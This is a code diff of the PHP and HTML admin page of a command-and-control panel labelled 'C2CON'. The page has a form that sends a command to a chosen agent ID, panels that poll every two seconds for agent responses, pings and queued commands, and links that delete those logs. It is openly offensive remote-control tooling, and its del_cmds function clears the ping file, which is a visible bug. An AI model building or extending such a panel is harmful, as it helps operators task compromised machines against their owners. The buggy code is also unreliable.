@@ -8,6 +8,50 @@ body, html {
   margin: 0;
 }
 
+.flex-row {
+    flex-direction: row;
+    display: flex;
+}
+
+
+.flex-column {
+    flex-direction: column;
+    display: flex;
+}
+
+.flex-body {
+    display: flex;
+}
+
+.flex-body div:not([class*="flex"]) {
+    border: 1px solid white;
+    flex: 1 1 200px;
+    width: 800px;
+}
+
+.res {
+        background-color: #000000;
+        height: 400px;
+        width: 600px;
+        
+        border:1px
+    }
+    
+.ping {
+        background-color: #000000;
+        height: 200px;
+        width: 600px;
+        
+        border:1px
+    }   
+    
+.cmds {
+        background-color: #000000;
+        height: 200px;
+        width: 600px;
+               border:1px
+    }     
+
 .bg {
  
   background-image: url("https://static.vecteezy.com/system/resources/previews/003/217/491/large_2x/cyber-hacker-attack-background-skull-free-vector.jpg");
@@ -147,24 +191,93 @@ file_put_contents($file, $current);
 
 <?php
  function del_res(){
-file_put_contents('/tmp/C2CON-cmds.txt', '');
+file_put_contents('/tmp/C2CON-res.txt', '');
 }
 
+ function del_ping(){
+file_put_contents('/tmp/C2CON-ping.txt', '');
+}
 
-  if (isset($_GET['del'])) {
+ function del_cmds(){
+file_put_contents('/tmp/C2CON-ping.txt', '');
+}
+
+  if (isset($_GET['delcmds'])) {
+    del_cmds();
+  }
+
+  if (isset($_GET['delres'])) {
     del_res();
+  }
+  
+    if (isset($_GET['delping'])) {
+    del_ping();
   }
 ?>
 
 
 
 <script>
-function reloadfrm() {
-  document.getElementById('iframeres').contentDocument.location.reload(true);
-  document.getElementById('iframeping').contentDocument.location.reload(true);
-  setTimeout(reloadfrm, 10000);
+
+
+
+
+
+function reloadres() {
+
+
+const xhr = new XMLHttpRequest();
+xhr.open('GET', 'readres.php', true);
+xhr.responseType = 'text';
+
+xhr.onload = () => {
+  if (xhr.readyState === xhr.DONE) {
+    if (xhr.status === 200) {
+      document.getElementById("res").innerHTML = xhr.responseText ;
+    }
+  }
+};
+
+xhr.send(null);
+setTimeout(reloadres, 2000);
 }
 
+
+function reloadping() {
+const xhr = new XMLHttpRequest();
+xhr.open('GET', 'readping.php', true);
+xhr.responseType = 'text';
+
+xhr.onload = () => {
+  if (xhr.readyState === xhr.DONE) {
+    if (xhr.status === 200) {
+      document.getElementById("ping").innerHTML = xhr.responseText ;
+    }
+  }
+};
+
+xhr.send(null);
+setTimeout(reloadping, 2000);
+  
+}
+
+function reloadcmds() {
+const xhr = new XMLHttpRequest();
+xhr.open('GET', 'readcmds.php', true);
+xhr.responseType = 'text';
+
+xhr.onload = () => {
+  if (xhr.readyState === xhr.DONE) {
+    if (xhr.status === 200) {
+      document.getElementById("cmds").innerHTML = xhr.responseText ;
+    }
+  }
+};
+
+xhr.send(null);
+setTimeout(reloadcmds, 2000);
+  
+}
 
 
 </script>
@@ -172,9 +285,9 @@ function reloadfrm() {
 <div>
 
 
-<div class="form-style-3">
+<div class="form-style-3" style=" margin: 0 auto;" >
 <form method="post" action="admin.php">
-<fieldset><legend>C2</legend>
+<fieldset><legend>C2CON</legend>
 <label for="field1"><span>Agent ID</span><input type="text" class="input-field" name="id" value="" /></label>
 <label for="field2"><span>CMD</span><input type="text" class="input-field" name="cmd" value="" /></label>
 <label><span> </span><input type="submit" value="Submit" /></label>
@@ -187,15 +300,21 @@ function reloadfrm() {
 
 
 
-<body onload="reloadfrm()"></body>
-<a href='admin.php?del=true'>Delete Logs</a>
+<body onload="reloadping();reloadres();reloadcmds();"></body>
+<a href='admin.php?delres=true'>Delete Responses</a>
+<a href='admin.php?delping=true'>Delete Ping</a>
+<a href='admin.php?delcmds=true'>Delete Cmds</a>
+
 
 </div>
-
-<div>
-<iframe src='readres.php' height=400 width=800 id="iframeres" style="border:0;background-color: Black;"></iframe><iframe src='readping.php' height=400 width=800 id="iframeping" style="border:0;background-color: Black;"></iframe>
-
+<div class="flex-body">
+<div class="flex-row">
+<div id="res" class="res" style=" margin: 0 auto;"></div>
 </div>
-
+<div class="flex-column">
+<div id="ping" class="ping" style=" margin: 0 auto;"></div>
+<div id="cmds" class="cmds" style=" margin: 0 auto;"></div>
+</div>
+</div>
 </div>
 </body></html>
